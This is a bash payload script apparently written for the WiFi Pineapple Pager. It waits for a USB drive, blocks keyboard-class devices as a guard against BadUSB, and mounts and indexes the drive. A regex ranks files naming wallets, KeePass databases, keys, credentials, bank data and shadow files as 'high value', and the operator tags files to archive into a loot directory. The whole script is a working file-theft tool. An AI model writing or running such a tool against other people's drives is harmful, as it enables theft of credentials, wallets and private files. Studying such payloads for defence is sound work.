#!/bin/bash
# Title: DUMPY_REVERSE_DUCKY
# Author: THENRGLABS
# Version: 1.5
# Optimized for WiFi Pineapple Pager

# --- 0. SELF-HEALING (DO NOT REMOVE) ---
# This line automatically fixes ^M and Non-Breaking Spaces if they appear
sed -i 's/\r//g; s/\xc2\xa0/ /g' "$0" 2>/dev/null

# --- 1. CONFIG ---
MOUNTPOINT="/mnt/usb"
LOOT_DIR="/root/loot/DUMP_USB"
MANIFEST="/tmp/dump_manifest.txt"
SELECTED="/tmp/selected_files.txt"
HIGH_VALUE_REGEX="wallet|kdbx|key|secret|bank|login|credential|config|pass|shadow"

mkdir -p "$MOUNTPOINT" "$LOOT_DIR"
> "$SELECTED"

# --- 2. FAIL-SAFE TRAP ---
safe_unmount() {
    sync
    umount -l "$MOUNTPOINT" 2>/dev/null
    modprobe usbhid 2>/dev/null
    
    LOG green "===================="
    LOG green "   SAFE TO REMOVE   "
    LOG green "===================="
    RINGTONE success
    sleep 5
}
trap safe_unmount EXIT SIGINT SIGTERM

# --- 3. ARMED & INTERROGATION ---
LOG blue "HID LOCKOUT: ACTIVE"
rmmod usbhid 2>/dev/null || modprobe -r usbhid 2>/dev/null

LOG "===================="
LOG yellow "  INSERT USB NOW    "
LOG "===================="
RINGTONE ring1

INITIAL_COUNT=$(ls /sys/bus/usb/devices/ | wc -l)
while true; do
    LED A 255; sleep 0.1; LED OFF; sleep 0.1
    CURRENT_COUNT=$(ls /sys/bus/usb/devices/ | wc -l)
    if [ "$CURRENT_COUNT" -gt "$INITIAL_COUNT" ]; then
        # Check for HID/Keyboard class to prevent BadUSB attacks
        IS_KBD=$(grep -Ei "Keyboard|HID" /proc/bus/input/devices)
        IS_CLASS=$(cat /sys/bus/usb/devices/*/bInterfaceClass 2>/dev/null | grep "03")
        
        if [ -n "$IS_KBD" ] || [ -n "$IS_CLASS" ]; then
            RINGTONE warning
            ALERT "FOWL PLAY DETECTED"
            rmmod usbhid 2>/dev/null
            while true; do LED B 255; sleep 0.5; LED OFF; sleep 0.5; done
        fi
        
        LOG green "NO FOWL PLAY DETECTED"
        RINGTONE health
        LOG cyan "HARDWARE DETECTED"
        sleep 2
        
        DEVICE=$(blkid | grep -o '/dev/sd[a-z][0-9]\+' | head -n 1)
        [ -n "$DEVICE" ] && break
        sleep 0.5
    fi
done

# --- 4. MOUNT & INDEX ---
LOG blue 'MOUNTING & INDEXING...'
mount -o ro,noatime "$DEVICE" "$MOUNTPOINT" || mount "$DEVICE" "$MOUNTPOINT"

find "$MOUNTPOINT" -mindepth 1 -type f 2>/dev/null > "$MANIFEST"
# Prioritize high-value files
grep -Ei "$HIGH_VALUE_REGEX" "$MANIFEST" > "${MANIFEST}.tmp" 2>/dev/null
grep -Eiv "$HIGH_VALUE_REGEX" "$MANIFEST" >> "${MANIFEST}.tmp" 2>/dev/null
mv "${MANIFEST}.tmp" "$MANIFEST"

IFS=$'\n' read -d '' -r -a FILES < "$MANIFEST"
COUNT=${#FILES[@]}
declare -A CHECKED

# --- 5. BROWSER ---
INDEX=0
while true; do
    FILE_PATH="${FILES[$INDEX]}"
    FILE_NAME=$(basename "$FILE_PATH")
    
    LOG white "FILE $((INDEX+1)) / $COUNT"
    [ "${CHECKED[$INDEX]}" == "1" ] && LOG green "[X] TAGGED" || LOG white "[ ] UNTAGGED"
    
    [[ "$FILE_PATH" =~ $HIGH_VALUE_REGEX ]] && LOG red "!! HIGH VALUE !!"
    LOG "NAME: ${FILE_NAME:0:18}"
    LOG blue "UP/DN:MOVE | B:TAG | A:DONE"
    
    KEY=$(WAIT_FOR_INPUT)
    if [ "$KEY" == "UP" ]; then
        ((INDEX--)); [ $INDEX -lt 0 ] && INDEX=$((COUNT-1))
    elif [ "$KEY" == "DOWN" ]; then
        ((INDEX++)); [ $INDEX -ge $COUNT ] && INDEX=0
    elif [ "$KEY" == "B" ]; then
        [ "${CHECKED[$INDEX]}" == "1" ] && CHECKED[$INDEX]="0" || CHECKED[$INDEX]="1"
    elif [ "$KEY" == "A" ]; then
        break
    fi
done

# --- 6. DUMP LOGIC ---
TAG_COUNT=0
for i in "${!CHECKED[@]}"; do [ "${CHECKED[$i]}" == "1" ] && ((TAG_COUNT++)); done

if [ "$TAG_COUNT" -gt 0 ]; then
    DUMP_MODE="SELECTED"
    RINGTONE leveldone
else
    resp=$(CONFIRMATION_DIALOG "Dump ALL Files?")
    if [ "$resp" == "$DUCKYSCRIPT_USER_CONFIRMED" ]; then
        DUMP_MODE="ALL"
        RINGTONE leveldone
    else
        exit 0
    fi
fi

# --- 7. EXECUTION ---
LOG yellow "DUMPING..."
ARCHIVE_NAME="$(date +%H%M)_USB_LOOT.tar"

if [ "$DUMP_MODE" == "SELECTED" ]; then
    for i in "${!CHECKED[@]}"; do
        [ "${CHECKED[$i]}" == "1" ] && echo "${FILES[$i]}" >> "$SELECTED"
    done
else
    cp "$MANIFEST" "$SELECTED"
fi

cd "$MOUNTPOINT"
# Clean paths for the tarball
sed -i "s|^$MOUNTPOINT/||" "$SELECTED"
tar -cf "$LOOT_DIR/$ARCHIVE_NAME" -T "$SELECTED" 2>/dev/null

LOG green "DUMP COMPLETE"
exit 0
